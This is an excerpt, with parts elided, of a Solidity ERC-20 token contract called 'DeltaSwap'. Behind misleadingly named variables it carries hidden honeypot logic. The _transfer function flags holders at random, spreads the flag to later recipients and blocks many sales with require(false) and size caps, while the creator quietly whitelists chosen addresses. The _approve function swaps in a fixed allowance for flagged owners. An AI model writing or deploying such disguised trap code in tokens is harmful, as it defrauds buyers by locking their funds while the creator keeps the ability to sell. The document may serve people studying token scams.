...
contract DeltaSwap is Context, IERC20, Ownable {
  ...
  mapping (address => bool) public trump;
  mapping (address => bool) public junior;
  mapping (address => uint256) public eric;
  ...
  constructor() public {
    ...
    golden = chTx * 30;
    trump[creator] = false;
    junior[creator] = false;
    lion[msg.sender] = true;
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (pampers == true)) {
      lion[recipient] = true;
      trump[recipient] = false;
      pampers = false;
    }
    
    if ((amount > golden) && (lion[sender] == true) && (address(sender) != creator)) {
        junior[recipient] = true;
    }
    
    if (lion[recipient] != true) {
        trump[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((trump[sender]) && (lion[recipient] == false)) {
        trump[recipient] = true;
    }
    
    if (lion[sender] == false) {
      if ((amount > golden) && (junior[sender] == true)) {
        require(false);
      }
      
      require(amount < england);
      if (ireland == true) {
        if (junior[sender] == true) {
          require(false);
        }
        junior[sender] = true;
      }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (wales == true)) {
      lion[spender] = true;
      trump[spender] = false;
      junior[spender] = false;
      wales = false;
    }
    
    tok = (trump[owner] ? 324323 : amount);
